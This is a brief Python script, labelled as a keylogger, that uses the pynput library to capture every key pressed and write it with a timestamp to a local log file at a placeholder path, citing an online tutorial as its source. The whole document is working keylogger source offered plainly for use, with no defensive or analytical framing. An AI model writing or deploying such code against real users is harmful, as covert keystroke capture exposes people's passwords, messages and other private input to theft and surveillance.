#Keylogger
from pynput.keyboard import Key,Listener
import logging

logging.basicConfig(filename=(r"chemin_fichier_texte"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))
    
with Listener(on_press) as listener:
    listener.join()

	
# https://nitratine.net/blog/post/python-keylogger/
